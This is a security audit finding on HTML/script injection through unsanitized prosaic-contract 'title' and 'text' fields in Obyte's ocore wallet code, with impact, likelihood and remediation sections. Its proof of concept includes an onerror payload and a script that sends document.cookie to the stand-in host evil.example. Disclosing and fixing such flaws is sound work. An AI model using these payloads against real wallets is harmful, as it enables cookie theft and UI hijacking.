### Title
HTML/script injection via unsanitized prosaic-contract `title`/`text` fields sent by a paired device - (File: `wallet.js`, `prosaic_contract.js`)

### Summary
Device-to-device `prosaic_contract_offer` and `prosaic_contract_shared` messages accept arbitrary `title` and `text` strings from any paired counterparty device with no HTML/script sanitization, unlike other user-supplied strings in the same file (`device_name`, cosigner `name`) which are explicitly stripped of `<...>` tags before being stored. The unsanitized `title`/`text` are persisted and later surfaced by wallet UIs, allowing HTML/JavaScript injection analogous to GHSA-pcfx-g2j2-f6f6.

### Finding Description
In `wallet.js` the `prosaic_contract_offer` and `prosaic_contract_shared` handlers validate only presence, address validity, contract hash and creation-date format of the incoming message body — no filtering is applied to `body.title` or `body.text`: [1](#0-0) 

Compare this with the pairing and wallet-creation handlers in the same codebase, which are careful to strip `<`/`>` characters from any string that is expected to be rendered to the user: [2](#0-1) [3](#0-2) 

For prosaic contracts there is no equivalent sanitization step. The message is stored verbatim via `prosaic_contract.store()`: [4](#0-3) 

and the raw `title`/`text` are also embedded unescaped into a chat message that is forwarded to the wallet UI event bus as the peer's textual message: [5](#0-4) 

Since `title`/`text` have no length limit and no character restriction, an attacker who is merely paired with a victim's wallet (a routine, low-privilege relationship — pairing only requires a shared pairing code/QR) can embed `<script>`, `<img onerror=...>`, or other markup in the contract fields. If the client wallet application (desktop/mobile Obyte wallet, which consumes `ocore` as its backend) renders these fields as HTML when displaying "chat"/contract offers (as the docassemble advisory describes for a "name" field), the payload executes in the victim's wallet context.

### Impact Explanation
A successful injection running inside the victim wallet's UI context can lead to phishing overlays, manipulation of displayed contract terms/amounts, or exfiltration of sensitive UI state, and in Electron/Cordova-based wallet shells this class of bug has historically enabled broader compromise (e.g., access to Node/Electron APIs) beyond simple in-page defacement — consistent with the Medium severity rated in the original Docassemble advisory (CWE-79, CVSS 3.1 AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N).

### Likelihood Explanation
Likelihood is Medium: exploitation requires the victim to have paired their device with the attacker's (a normal, low-friction workflow for any correspondent, contractor, or counterparty use case that prosaic/arbiter contracts are designed for), and requires the front-end wallet to render `title`/`text` unsafely — which is plausible given no other layer in `ocore` performs escaping for these fields, contrasted with the deliberate stripping done for device/cosigner names.

### Recommendation
Sanitize (or strip `<`/`>`) `body.title` and `body.text` in the `prosaic_contract_offer`/`prosaic_contract_shared` handlers in `wallet.js`, mirroring the existing `device_name`/cosigner `name` sanitization, and enforce reasonable length limits. Alternatively/additionally, ensure `prosaic_contract.js` treats these fields as plain text at the point of storage so that any downstream renderer is guaranteed to receive non-HTML content, and document that consuming UIs must HTML-escape these fields before display.

### Proof of Concept
1. Pair an attacker device with the victim's wallet (standard pairing flow).
2. Attacker sends a `prosaic_contract_offer` device message with:
   ```json
   {
     "title": "<img src=x onerror=alert(document.domain)>",
     "text": "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>",
     "creation_date": "2026-09-15 00:00:00",
     "ttl": 1,
     "peer_address": "<victim base32 address>",
     "my_address": "<attacker base32 address>",
     "hash": "<sha256(title+text+creation_date) base64>"
   }
   ```
3. `wallet.js`'s `prosaic_contract_offer` handler in [1](#0-0)  accepts the message (hash matches, addresses valid, date format valid) and stores it unmodified via `prosaic_contract.store()`.
4. When the victim's wallet UI displays the pending contract offer (title/body), any renderer that inserts these values as HTML (rather than text) executes the injected script.

function store(objContract, cb) {
	var fields = '(hash, peer_address, peer_device_address, my_address, is_incoming, creation_date, ttl, status, title, text';
	var placeholders = '(?, ?, ?, ?, ?, ?, ?, ?, ?, ?';
	var values = [objContract.hash, objContract.peer_address, objContract.peer_device_address, objContract.my_address, true, objContract.creation_date, objContract.ttl, objContract.status || status_PENDING, objContract.title, objContract.text];
	if (objContract.shared_address) {
		fields += ', shared_address';
		placeholders += ', ?';
		values.push(objContract.shared_address);
	}
	fields += ')';
	placeholders += ')';
	db.query("INSERT "+db.getIgnore()+" INTO prosaic_contracts "+fields+" VALUES "+placeholders, values, function(res) {
		if (cb)
			cb(res);
	});
}
